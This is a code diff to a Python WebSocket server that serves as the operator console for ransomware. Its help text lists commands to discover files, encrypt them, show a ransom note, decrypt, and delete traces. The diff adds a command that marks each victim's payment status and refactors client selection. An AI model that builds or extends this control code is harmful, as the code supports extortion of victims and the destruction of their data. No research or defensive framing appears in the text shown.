@@ -38,6 +38,7 @@ class WebSocketCLIServer:
 
             await websocket.send(self.__create_auth_reply(True))
             print(f"[{username}] is connected to the server.")
+            print(self.__generate_cli_text() + "> ", end='', flush=True)
 
             # async for message in websocket:
             #     print(f"[{username}] {message}")
@@ -87,11 +88,8 @@ class WebSocketCLIServer:
         """Handle CLI input from the server terminal."""
         loop = asyncio.get_event_loop()
         while self.__should_cli_run:
-            cli_text = "CLI"
-            if self.__selected_client:
-                cli_text += f"({self.__selected_client.username})"
 
-            msg = await loop.run_in_executor(None, input, f"{cli_text}> ")
+            msg = await loop.run_in_executor(None, input, f"{self.__generate_cli_text()}> ")
             match msg.split():
                 case ["help"]:
                     self.__show_help()
@@ -100,13 +98,11 @@ class WebSocketCLIServer:
                 case ["connections"]:
                     self.__show_connections()
                 case ["select", username]: 
-                    if username in self.connected_clients.keys():
-                        self.__selected_client = self.connected_clients[username]
-                        print(f"Selected client: {username}")
-                    else:
-                        print(f"No client with username: {username}")
+                    self.__select_client(username)
                 case ["connectioninfo"]:
                     self.__show_connection_info()
+                case ["setpaymentstatus", status]:
+                    self.__set_payment_status(status)
                 case ["exit"] | ["quit"]:  
                     print("Shutting down server...")
                     await self.close_all_clients()
@@ -118,6 +114,13 @@ class WebSocketCLIServer:
     
             #await self.broadcast(f"[Server CLI] {msg}")
 
+    def __generate_cli_text(self) -> str:
+        """Generate the CLI prompt text."""
+        cli_text = "CLI"
+        if self.__selected_client:
+            cli_text += f"({self.__selected_client.username})"
+        return cli_text
+    
     def __show_help(self):
         """Display available CLI commands."""
         print("Available commands:")
@@ -126,7 +129,6 @@ class WebSocketCLIServer:
         print("\tconnections - shows all connected clients")
         print("\tselect <username> - select a client to interact with")
         print("\tconnectioninfo - shows information about the selected client")
-        print("\tenvcheck - checks the environment in which the program is running")
         print("\tdirectory - discovers the files in the system avoiding specific file types and folders")
         print("\t\tDefault is '/'")
         print("\t\tExample: directory /Users/username/Documents")
@@ -136,6 +138,7 @@ class WebSocketCLIServer:
         print("\t\t\t--delete (deletes files after encryption/decryption)")
         print("\tencrypt - encrypts the discovered files")
         print("\transomnote - displays the ransom note to the user")
+        print("\tsetpaymentstatus <true/false> - sets the payment status of the selected client")
         print("\tdecrypt - decrypts the previously encrypted files")
         print("\tdeletetraces - deletes traces of the program")
         print("\ttestfunc - runs the function to be tested")
@@ -151,12 +154,16 @@ class WebSocketCLIServer:
         for username, conn in self.connected_clients.items():
             print(f"- {username} (State: {conn.state.name})")
 
-    def __check_selected_client(self) -> bool:
-        """Check if a client is selected."""
-        if self.__selected_client is None:
-            print("No client selected. Use 'select <username>' to select a client.")
-            return False
-        return True
+    def __select_client(self, username: str):
+        """Select a client by username."""
+        if username in self.connected_clients.keys():
+            self.__selected_client = self.connected_clients[username]
+            print(f"Selected client: {username}")
+
+            for conn in self.connected_clients.values():
+                conn.set_selected_client(username)
+        else:
+            print(f"No client with username: {username}")
     
     def check_selected_client(func):
         """Decorator to ensure a client is selected before running the method."""
@@ -171,6 +178,15 @@ class WebSocketCLIServer:
     def __show_connection_info(self):
         """Display information about the selected client."""
         self.__selected_client.show_info()
+
+    @check_selected_client
+    def __set_payment_status(self, status):
+        if status.lower() in ["true", "false"]:
+            is_paid = status.lower() == "true"
+            self.__selected_client.set_payment_status(is_paid)
+            print(f"Set payment status of {self.__selected_client.username} to {is_paid}.")
+        else:
+            print("Invalid status. Use 'true' or 'false'.")
 
     async def broadcast(self, message, sender=None):
         """Send a message to all connected clients."""
